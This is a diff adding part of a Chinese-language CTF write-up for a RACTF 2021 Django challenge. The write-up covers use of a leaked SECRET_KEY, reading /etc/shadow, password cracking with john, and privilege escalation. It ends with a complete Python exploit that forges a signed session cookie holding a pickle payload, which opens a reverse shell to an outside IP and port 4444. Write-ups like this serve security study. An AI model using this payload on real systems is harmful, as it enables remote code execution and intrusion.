@@ -298,6 +298,63 @@ STATIC_URL = '/static/'
 DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
 ```
 
+其中我们可以发现非常关键的`SECRET_KEY`，而且还有该环境的`session`序列化采用的是`pickle`库，可以联系到`django`框架之前出现的`session`反序列化漏洞，能得到一个`shell`
 
+> `windows`和`linux`的`pickle`是跨平台的，但是`os`模块并不是跨平台的
+
+![ractf202112](img/ractf2021/ractf202112.png)
+
+但是我们并没有权限去访问该文件，但是可以发现他的用户组属于`admin`，访问`/etc/passwd`和`/etc/shadow`还有`/etc/group`
+
+![ractf202113](img/ractf2021/ractf202113.png)
+
+![ractf202114](img/ractf2021/ractf202114.png)
+
+从中可以发现，`admin`属于`flag`组，以及`admin`相关的密码信息，`john`爆破
+
+![ractf202115](img/ractf2021/ractf202115.png)
+
+利用改密码提权拿到`flag`
+
+![ractf202116](img/ractf2021/ractf202116.png)
 
 ### payload
+
+```python
+from django.core.signing import TimestampSigner, b64_encode
+from django.utils.encoding import force_bytes
+from django.conf import settings
+import pickle
+import os
+import requests
+
+
+class PickleRCE(object):
+    def __reduce__(self):
+        return (os.system, (
+            """python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("144.34.245.238",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'""",
+        ))
+
+
+SECRET_KEY = 'wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7"(S3xv,{sp)Xaqg?2pj2=hFCgN"CR"UPn4'
+settings.configure(DEFAULT_HASHING_ALGORITHM='sha256')
+
+
+def rotten_cookie():
+    key = force_bytes(SECRET_KEY)
+    print('key:'+str(key))
+    salt = 'django.contrib.sessions.backends.signed_cookies'
+    pick = pickle.dumps(PickleRCE(), protocol=0)
+    print(pick)
+    base64d = b64_encode(pick).decode()
+    print('base64d: '+str(base64d))
+    return TimestampSigner(key, salt=salt).sign(base64d)
+
+
+forge_sessionid = rotten_cookie()
+print(forge_sessionid)
+r = requests.get('http://193.57.159.27:42585',
+                 cookies={'sessionid': forge_sessionid})
+print(r.status_code)
+```
+
